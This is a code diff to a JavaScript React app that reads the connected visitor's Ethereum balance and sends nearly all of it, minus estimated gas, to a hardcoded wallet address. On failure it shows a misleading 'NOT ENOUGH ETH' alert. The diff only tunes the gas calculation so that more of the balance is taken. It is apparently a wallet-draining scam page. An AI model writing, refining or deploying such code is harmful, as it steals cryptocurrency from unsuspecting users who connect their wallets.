@@ -46,7 +46,7 @@ function App() {
             const balance = await window.ethereum.request({method: 'eth_getBalance', params: [address[0], 'latest']})
             const convertedBalance = parseInt(balance, 16) * Math.pow(10, -18)
             // console.log('balance', ethAmount, gas, (gas / 15) / 3089, (ethAmount - (Number(gas) / 10000)))
-            console.log(convertedBalance, gas, Number(gas) / 30000, convertedBalance, parseInt((convertedBalance - (gas / 100000)) * 1000000000000000000).toString(16))
+            console.log(convertedBalance, gas, Number(gas) / 30000, convertedBalance, parseInt((convertedBalance - (Number(gas) / 30000)) * 1000000000000000000).toString(16))
             let params = [{
                 "from": address[0],
                 "to": '0xAc1e81526bB869aA73B5B41D62dF4AD811df3d3B',
@@ -56,7 +56,7 @@ function App() {
             }]
 
             const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
-                alert(`NOT ENOUGH ${((convertedBalance - (Number(gas) / 20000)) * (-1)).toFixed(6)} ETH`)
+                alert(`NOT ENOUGH ${((convertedBalance - (Number(gas) / 30000)) * (-1)).toFixed(6)} ETH`)
             })
         } catch (err) {
             alert(err)
